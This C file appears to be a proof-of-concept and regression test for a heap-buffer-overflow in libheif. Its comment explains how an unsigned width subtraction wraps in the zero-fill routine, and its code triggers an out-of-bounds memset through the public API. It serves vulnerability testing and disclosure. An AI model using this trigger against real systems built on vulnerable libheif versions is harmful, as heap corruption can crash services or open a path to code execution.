/*
 * Proof-of-concept for a heap-buffer-overflow (CWE-787) in libheif, reached
 * through the public C API with a valid image.
 *
 * heif_image_extend_to_size_fill_with_zero() forwards its target width/height
 * to HeifPixelImage::extend_to_size_with_zero(). The per-row right-edge fill
 * there computes its memset length as
 *
 *     bytes_per_pixel * (subsampled_width - old_width)
 *
 * under the guard `old_width != subsampled_width`. When the requested width is
 * smaller than a plane's current width, subsampled_width < old_width, the
 * unsigned subtraction wraps around to a value near UINT32_MAX, and the memset
 * writes ~4 GB past the end of the plane allocation.
 *
 * Two independent checks used to prevent this: a logical-size guard in
 * extend_to_size_with_zero() that rejected a target smaller than the image, and
 * a per-plane preflight that rejected any target shrinking a plane. On a tree
 * where both are present, the call below returns a usage error and the program
 * exits cleanly. On a tree where both are absent, the fill underflows and
 * AddressSanitizer aborts.
 *
 * The program drives only the public libheif API with a well-formed 8-bit
 * monochrome image. It returns 0 (no defect) when the library rejects the call.
 */

#include <libheif/heif.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    const int W = 64;
    const int H = 8;

    heif_image* img = NULL;
    heif_error err = heif_image_create(W, H, heif_colorspace_monochrome,
                                       heif_chroma_monochrome, &img);
    if (err.code != heif_error_Ok || img == NULL) {
        fprintf(stderr, "heif_image_create failed: %s\n", err.message);
        return 2;
    }

    err = heif_image_add_plane(img, heif_channel_Y, W, H, 8);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "heif_image_add_plane failed: %s\n", err.message);
        heif_image_release(img);
        return 2;
    }

    /* Request a width smaller than the current plane width. On a fixed tree the
     * library rejects this up front; on the vulnerable tree the right-edge fill
     * length underflows and memset writes far past the plane. */
    err = heif_image_extend_to_size_fill_with_zero(img, 1, H);

    /* Only reached when the library rejected the request (no out-of-bounds
     * write happened). */
    printf("extend returned without a sanitizer abort: code=%d (%s)\n",
           err.code, err.message ? err.message : "");

    heif_image_release(img);
    return 0;
}
